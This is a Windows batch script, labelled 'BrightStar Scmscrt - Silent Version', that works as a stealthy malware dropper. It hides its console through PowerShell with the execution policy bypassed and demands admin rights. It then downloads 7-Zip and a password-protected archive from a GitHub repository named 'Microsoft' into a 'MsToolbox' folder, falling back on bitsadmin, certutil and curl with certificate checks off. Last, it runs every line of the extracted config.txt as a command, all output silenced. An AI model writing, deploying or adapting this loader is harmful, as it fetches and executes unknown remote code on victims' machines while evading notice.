@echo off
:: BrightStar Scmscrt - Silent Version
:: Downloads 7z.exe and extracts scmscrt archive silently

:: Hide console window by restarting with PowerShell if not already hidden
if not "%1"=="hidden" (
    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden"
    exit
)

:: Check for administrator privileges silently
net session >nul 2>&1
if %errorLevel% neq 0 (
    exit /b 1
)

:: Set target directory
set "TARGET_DIR=C:\ProgramData\MsToolbox"
set "TARGET_FILE=%TARGET_DIR%\7z.exe"
set "CONFIG_FILE=C:\ProgramData\MsToolbox\scmscrt\config.txt"

:: Create target directory if it doesn't exist
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" >nul 2>&1

:: Smart execution - if config.txt already exists, execute immediately
if exist "%CONFIG_FILE%" goto :execute_config

:: Check if 7z.exe already exists and works
if exist "%TARGET_FILE%" (
    "%TARGET_FILE%" >nul 2>&1
    if not errorlevel 1 goto :start_archive_download
)

:: Download 7z.exe silently
powershell -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7zr.exe' -OutFile '%TARGET_FILE%' -UseBasicParsing } catch { }" >nul 2>&1
if exist "%TARGET_FILE%" goto :start_archive_download

:: Try alternative download methods
bitsadmin /transfer "7zDownload" "https://www.7-zip.org/a/7zr.exe" "%TARGET_FILE%" >nul 2>&1
if exist "%TARGET_FILE%" goto :start_archive_download

set "TEMP_FILE=%TEMP%\7zr_temp.exe"
certutil -urlcache -split -f "https://www.7-zip.org/a/7zr.exe" "%TEMP_FILE%" >nul 2>&1
if exist "%TEMP_FILE%" (
    move "%TEMP_FILE%" "%TARGET_FILE%" >nul 2>&1
    goto :start_archive_download
)

curl -L -o "%TARGET_FILE%" "https://www.7-zip.org/a/7zr.exe" >nul 2>&1
if exist "%TARGET_FILE%" goto :start_archive_download

curl -L -k -o "%TARGET_FILE%" "https://www.7-zip.org/a/7zr.exe" >nul 2>&1
if exist "%TARGET_FILE%" goto :start_archive_download

exit /b 1

:start_archive_download
:: Set paths and parameters
set "SEVEN_ZIP=C:\ProgramData\MsToolbox\7z.exe"
set "BASE_DIR=C:\ProgramData\MsToolbox"
set "SCMSCRT_DIR=%BASE_DIR%\scmscrt"
set "ARCHIVE_FILE=%BASE_DIR%\scmscrt.zip"
set "PASSWORD=1day"
set "DOWNLOAD_URL_1=https://github.com/skynox7/Microsoft/raw/refs/heads/main/scmscrt.zip"
set "DOWNLOAD_URL_2=https://example.com/scmscrt.zip"

:: Create scmscrt directory if it doesn't exist
if not exist "%SCMSCRT_DIR%" mkdir "%SCMSCRT_DIR%" >nul 2>&1

:: Smart execution - if config.txt already exists, skip downloads and execute
if exist "%CONFIG_FILE%" goto :execute_config

:: Download scmscrt.zip silently
powershell -Command "try { Invoke-WebRequest -Uri '%DOWNLOAD_URL_1%' -OutFile '%ARCHIVE_FILE%' -UseBasicParsing } catch { }" >nul 2>&1
if exist "%ARCHIVE_FILE%" goto :extract_zip

powershell -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%DOWNLOAD_URL_2%' -OutFile '%ARCHIVE_FILE%' -UseBasicParsing } catch { }" >nul 2>&1
if exist "%ARCHIVE_FILE%" goto :extract_zip

bitsadmin /transfer "scmscrtDownload" "%DOWNLOAD_URL_1%" "%ARCHIVE_FILE%" >nul 2>&1
if exist "%ARCHIVE_FILE%" goto :extract_zip

set "TEMP_ARCHIVE=%TEMP%\scmscrt_temp.zip"
certutil -urlcache -split -f "%DOWNLOAD_URL_1%" "%TEMP_ARCHIVE%" >nul 2>&1
if exist "%TEMP_ARCHIVE%" (
    move "%TEMP_ARCHIVE%" "%ARCHIVE_FILE%" >nul 2>&1
    goto :extract_zip
)

curl -L -o "%ARCHIVE_FILE%" "%DOWNLOAD_URL_1%" >nul 2>&1
if exist "%ARCHIVE_FILE%" goto :extract_zip

curl -L -k -o "%ARCHIVE_FILE%" "%DOWNLOAD_URL_2%" >nul 2>&1
if exist "%ARCHIVE_FILE%" goto :extract_zip

exit /b 1

:extract_zip
if not exist "%ARCHIVE_FILE%" exit /b 1

:: Extract using 7z with password to scmscrt folder silently
"%SEVEN_ZIP%" x "%ARCHIVE_FILE%" -o"%SCMSCRT_DIR%" -p%PASSWORD% -y >nul 2>&1
if errorlevel 1 exit /b 1

:: Check for nested ZIP file and extract silently
set "NESTED_ZIP=%SCMSCRT_DIR%\scmscrt.zip"
set "NESTED_ZIP_TEMP=%SCMSCRT_DIR%\scmscrt_temp.zip"

if exist "%NESTED_ZIP%" (
    "%SEVEN_ZIP%" x "%NESTED_ZIP%" -o"%SCMSCRT_DIR%" -p%PASSWORD% -y >nul 2>&1
    del "%NESTED_ZIP%" >nul 2>&1
) else if exist "%NESTED_ZIP_TEMP%" (
    "%SEVEN_ZIP%" x "%NESTED_ZIP_TEMP%" -o"%SCMSCRT_DIR%" -p%PASSWORD% -y >nul 2>&1
    del "%NESTED_ZIP_TEMP%" >nul 2>&1
)

:execute_config
:: Execute command from config.txt if it exists
if exist "%CONFIG_FILE%" (
    for /f "usebackq delims=" %%i in ("%CONFIG_FILE%") do %%i >nul 2>&1
)

:: Clean up archive file only if it exists
if exist "%ARCHIVE_FILE%" del "%ARCHIVE_FILE%" >nul 2>&1

exit /b 0
